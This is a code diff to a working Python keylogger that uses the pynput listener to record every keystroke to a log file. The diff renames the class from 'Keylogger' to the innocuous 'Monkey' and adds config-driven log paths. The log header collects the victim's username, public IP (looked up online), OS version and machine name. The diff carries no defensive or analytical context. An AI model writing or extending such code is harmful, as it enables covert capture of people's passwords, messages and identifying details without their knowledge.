@@ -7,15 +7,15 @@ from requests import get
 from _thread import start_new_thread
 from pynput.keyboard import Listener
 
+from config import MonkeyConfig
 
-class Keylogger:
-    def __init__(self, saving_dir:str = "") -> None:
+
+class Monkey:
+    def __init__(self, config: MonkeyConfig) -> None:
         self._logged_data = []
         self._count = 0
         self._last_time = time.time()
-
-        saving_dir = saving_dir if saving_dir != "" else "."
-        self._log_file = f'{saving_dir}{sep}logs-{self._last_time}.out'
+        self._log_file = config.filepath
 
         self._substitution = \
             {'Key.enter': '[ENTER]\n','Key.backspace': '[BACKSPACE]',
@@ -29,25 +29,29 @@ class Keylogger:
             'Key.menu': '[MENU]','Key.cmd': '[WINDOWS KEY]',
             'Key.print_screen': '[PRNT SCR]','\\x03':'[CTRL-C]',
             '\\x16': '[CTRL-V]'}
-        
-        self._add_header_msg()
 
     def _write_file(self) -> None:
-        with open(self._log_file, 'a') as key_strokes:
-            key_strokes.write("".join(self._logged_data))
+        if not path.exists(self._log_file):
+            with open(self._log_file, 'w') as f:
+                f.write(self._get_header_msg())
+            
+        with open(self._log_file, 'a') as f:
+            f.write("".join(self._logged_data))
         
         self._logged_data.clear()
 
     # add header to file to with extra info
-    def _add_header_msg(self) -> None:
+    def _get_header_msg(self) -> str:
         datetime = time.ctime(time.time())
         user = path.expanduser('~').split(sep)[2]
-        publicIP = get('https://api.ipify.org/').text
+        try:
+            publicIP = get('https://api.ipify.org/').text
+        except:
+            publicIP = "Null"
         uname_result = uname()
 
-        msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ Username: {user}\n  *~ Public-IP: {publicIP}\n  *~ OS: {uname_result.system} {uname_result.version}\n  *~ Node: {uname_result.node}\n\n'
+        return f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ Username: {user}\n  *~ Public-IP: {publicIP}\n  *~ OS: {uname_result.system} {uname_result.version}\n  *~ Node: {uname_result.node}\n\n'
 
-        self._logged_data.append(msg)
 
     def _on_press(self, key) -> None:
         # add newline if there is a gap in typing
@@ -76,8 +80,10 @@ class Keylogger:
                 listener.join()
         finally:
             self._write_file()
-            exit(1)
 
 
 if __name__ == '__main__':
-    Keylogger().run()
+    try:
+        Monkey(MonkeyConfig()).run()
+    finally:
+        exit(0)
